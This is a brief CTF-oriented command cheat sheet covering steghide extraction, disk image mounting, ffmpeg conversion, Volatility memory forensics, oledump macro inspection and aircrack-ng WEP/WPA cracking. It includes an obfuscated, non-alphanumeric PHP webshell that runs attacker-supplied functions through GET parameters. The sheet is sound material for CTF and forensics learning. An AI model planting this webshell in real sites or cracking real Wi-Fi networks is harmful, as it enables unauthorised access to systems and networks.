# CTF-like Tools
======
#### Extract Data from JPG
steghide -extract -p <password> -sf <file>
#### Boot a DOS/MBR Image
qemu-system-i386 floppy.img; vncviewer 127.0.0.1
#### PHP Webshell without alphanum
```

<?=$_='$<>/'^'{{{{';${$_}[_](${$_}[__]);
// $_= '$<>/' ^ '{{{{' ----> $_ = '_GET'
// ${_GET}[_](${_GET})[__];
// final <?=$_GET[_]($_GET[__])
```
#### Read IMG, Data Dump, or Physical Device
fdisk -l disk.img
#### Mount only part of IMG file
mount -v -o offset=135266304 -t ext4 pi.img /mnt (where offset is equal to sector size * start)
#### Convert DVD Files to MP4
cat VTS_0*_*VOB | ffmpeg -i - -vcodec h264 -acodec mp2 rip.mp4
#### Reduce Size of Video Files (lower compression/crf means higher quality)
ffmpeg -i movie.mpg -c:v libx264 -b:v 1.5M -c:a ac3 -b:a 128k movie_comp.mpg

## Volatility
------
#### Find possible profiles/offsets
volatility -f OL4.raw kdbgscan
#### List processes
volatility -f OL4.raw pslist --profile=Win2012x64
#### List variables within processes
volatility -f OL4.raw --profile=Win2012x64 envars
#### Bind to port (<1024) without root
echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start

## Examine Microsoft Office Macros
------
#### List OLE objects
oledump file.docm
#### Dump OLE object
oledump file.docm -s 4 -d

## Wifi
------
#### Crack WEP
aircrack-ng data.cap (WEP may be cracked with a sufficiently high number of handshakes , > ~1000)
#### Crack WPA
aircrack-ng -w wordlist.txt data.pcap